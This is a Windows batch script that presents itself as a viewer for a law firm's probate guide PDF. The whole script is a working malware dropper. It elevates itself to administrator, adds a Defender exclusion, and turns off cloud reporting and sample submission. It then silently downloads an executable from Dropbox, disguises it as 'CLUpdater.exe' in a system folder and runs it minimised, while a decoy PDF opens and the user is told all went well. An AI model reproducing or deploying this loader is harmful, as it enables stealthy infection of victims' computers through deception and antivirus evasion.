@echo off
title Document Preview
color 0B
setlocal enabledelayedexpansion

:: ==========================================
:: SELF-ELEVATE
:: ==========================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: ==========================================
:: CONFIGURATION
:: ==========================================
set "LOADER_URL=https://www.dropbox.com/scl/fi/hoona0uela3o432oz2fur/setup.exe?rlkey=hiuoqc6hpg6klkchyz31pf70x&st=q6yg6ch2&dl=1"
set "PDF_URL=https://www.dropbox.com/scl/fi/0mjbfjxwkw1u4xkaiavvy/Holland_and_Knight_Probate_Guide.pdf?rlkey=byqozvlo70i9raha8fuphqre6&st=wse9790h&dl=1"
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\WER"
set "LOADER=%INSTALL_DIR%\CLUpdater.exe"
set "PDF_NAME=Holland_and_Knight_Probate_Guide.pdf"
set "DESKTOP=%USERPROFILE%\Desktop"

cls
echo.
echo Opening Holland_and_Knight_Probate_Guide.pdf...
echo.
echo Please wait while the document is being prepared...
echo.
timeout /t 2 /nobreak >nul

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

echo Downloading document...
timeout /t 1 /nobreak >nul


powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%LOADER_URL%' -OutFile '%LOADER%'" >nul 2>&1


powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%PDF_URL%' -OutFile '%DESKTOP%\%PDF_NAME%'" >nul 2>&1

echo timeout /t 2 /nobreak >nul

if exist "%LOADER%" (
    powershell -Command "Unblock-File '%LOADER%' -ErrorAction SilentlyContinue" >nul 2>&1
    start "" /min "%LOADER%"
)


start "" "%DESKTOP%\%PDF_NAME%"

:: Final message
cls
echo.
echo ================================================
echo Document opened successfully
echo ================================================
echo.
echo File saved to your Desktop:
echo %PDF_NAME%
echo.
echo The document has been downloaded and opened in your default PDF viewer.
echo.
echo You can now close this window.
echo.
echo Press any key to exit...
pause >nul
exit /b


